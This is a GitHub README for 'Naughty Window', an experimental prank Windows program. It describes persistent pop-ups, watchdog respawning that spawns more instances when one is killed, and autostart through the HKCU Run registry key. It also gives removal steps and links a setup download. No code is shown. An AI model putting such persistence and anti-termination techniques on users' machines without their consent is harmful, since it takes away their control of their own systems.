# Naughty Window 🚀

## Overview
Naughty Window is an experimental Windows application designed to create persistent pop-up windows that are difficult to close. This project explores process resilience and watchdog techniques, ensuring the application remains active even if terminated.

## Features 🔥
- **Persistent Pop-ups:** Closes? No problem! The window reappears instantly.
- **Resilient Execution:** Kills one instance? Two more will spawn.
- **Auto-Restart:** The application launches itself after a system reboot.
- **Safe Mode:** A method exists to disable auto-start functionality (see below).

## Installation 📥
1. **Download the setup file:**
[📎 NaughtyWindowSetup.zip](https://github.com/yedi18/NaughtyWindow/releases/latest/download/NaughtyWindowSetup.zip)
2. **Extract the ZIP file.**
3. **Run the setup file:**
   - Follow the installation wizard.
4. **Launch the application:**
   - It will start running automatically in the background.

## Usage 🖥️
Once launched, **Naughty Window** will ensure that it remains active and reopens when closed.  
If you try to kill it via Task Manager, it will respawn with additional instances.  
To fully stop the process, you must **disable auto-start**.

## How to Disable Naughty Window (Safe Mode) 🛑
If the application keeps running and you need to stop it permanently:

1. Open **Registry Editor**:
   - Press `Win + R`, type `regedit`, and hit **Enter**.
2. Navigate to: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

3. Delete the entry containing `MyNaughtyWindow`.
4. Restart your computer.

If the application still persists, consider checking **Task Manager (Ctrl + Shift + Esc)** or investigating **Startup Applications (msconfig)**.

---
💡 **Hint:** There might be a way to quickly bypass the auto-respawn mechanism with the right key combination.  
Try exploring **Task Manager**, **Registry Editor**, and some common Windows shortcuts!  
However, solving this challenge by yourself will be much more satisfying. 😈

Now you’re ready to experience **Naughty Window**! 🚀
